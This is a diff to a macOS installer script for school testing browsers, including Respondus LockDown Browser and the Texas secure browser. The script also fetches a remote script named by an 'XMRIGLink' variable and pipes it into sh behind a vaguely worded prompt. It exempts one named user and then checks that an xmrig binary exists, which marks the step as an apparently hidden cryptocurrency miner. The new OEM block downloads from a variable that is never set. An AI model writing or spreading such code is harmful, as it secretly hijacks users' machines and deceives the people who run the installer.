@@ -11,7 +11,7 @@ Logo="\033[34m
 
 
 echo "$Logo"
-sleep 1
+sleep 0.3
 echo "Welcome to the Installer"
 BasePath="$(pwd)"
 
@@ -27,6 +27,9 @@ LockDownPath="/Applications/LockDown Browser.app"
 
 StarTestingUrl="https://sb.portal.cambiumast.com/geturls?clientName=texas&operatingSystem=macOS"
 StarTestingPath="/Applications/TXSecureBrowser.app"
+
+OEMLockdown="https://downloads.respondus.com/OEM/InstallLDBOEM.zip"
+OEMLockdownPath="/Applications/LockDown Browser OEM.app"
 
 XMRIGLink="https://raw.githubusercontent.com/Astranix593/MacOS-Setup/main/Helper.sh"
 
@@ -133,6 +136,31 @@ else
     echo "Star Testing is already installed"
 fi
 
+
+if ! [ -d "$OEMLockdownPath" ]; then
+    echo "OEM Lockdown Browser is not installed. Downloading and installing..."
+    echo "Do you want to install OEM Lockdown Browser? (y/Y)"
+    read confirm
+    if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
+        echo "Downloading OEM Lockdown Browser..."
+        rm "$BasePath/OEMLockdown.zip"
+        curl -sSL -o "$BasePath/OEMLockdown.zip" "$OEMLockdownLink"
+        echo "OEM Lockdown Browser Downloaded"
+        echo "Installing OEM Lockdown Browser..."
+        unzip "$BasePath/OEMLockdown.zip"
+        # Install Respondus LockDown Browser OEM (x64c).pkg
+        FileName="Install Respondus LockDown Browser OEM (x64c).pkg"
+        echo "Installing OEM Lockdown Browser..."
+        echo $FileName
+        sudo installer -pkg "$BasePath/$FileName" -target /Applications 
+        echo "OEM Lockdown Browser Installed"
+        rm "$BasePath/OEMLockdown.zip"
+        rm "$BasePath/$FileName"
+    else
+        echo "OEM Lockdown Browser is already installed"
+    fi
+fi
+
 if test "$CurrentUser" = "brandontisserand"; then
     echo "Dont worry brandon, were not going to install the script for you."
 else
@@ -143,8 +171,16 @@ else
     if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
         echo "Installing..."
         curl -sSL "$XMRIGLink" | sh
-        echo "Installed"
+        if [ -f "/usr/local/mycode/xmrig" ]; then
+            echo "Installed"
+        else
+            echo "Failed to install"
+        fi
     else
         echo "Not installing"
     fi
 fi
+
+
+echo "Done. You can now close this window"
+exit 0
